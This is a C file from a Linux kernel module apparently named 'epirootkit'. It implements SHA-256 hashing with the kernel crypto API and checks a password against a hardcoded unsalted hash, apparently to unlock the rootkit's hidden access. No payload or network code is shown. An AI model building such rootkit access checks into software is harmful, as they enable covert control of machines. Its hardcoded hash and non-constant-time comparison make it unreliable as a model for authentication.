#include "auth.h"

static const char PASSWORD_HASH[] = "1e29e7045275a60d15275bf8e97b5a47644844f2bca62d70476e11ad0543e000";

int calculer_sha256(const char *data, char *hash_hex)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    unsigned char hash[32];
    int ret = 0;
    int i;
    
    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) {
        return PTR_ERR(tfm);
    }
    
    desc = kmalloc(sizeof(struct shash_desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
    if (!desc) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }
    
    desc->tfm = tfm;
    
    ret = crypto_shash_init(desc);
    if (ret)
        goto out;
        
    ret = crypto_shash_update(desc, data, strlen(data));
    if (ret)
        goto out;
        
    ret = crypto_shash_final(desc, hash);
    if (ret)
        goto out;
    
    for (i = 0; i < 32; i++) {
        sprintf(hash_hex + (i * 2), "%02x", hash[i]);
    }
    hash_hex[64] = '\0';
    
out:
    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

bool verifier_mot_de_passe(const char *password)
{
    char hash_calcule[65];
    int ret;
    
    ret = calculer_sha256(password, hash_calcule);
    if (ret != 0) {
        pr_err("epirootkit: Erreur calcul SHA256: %d\n", ret);
        return false;
    }
    
    return (strcmp(hash_calcule, PASSWORD_HASH) == 0);
}
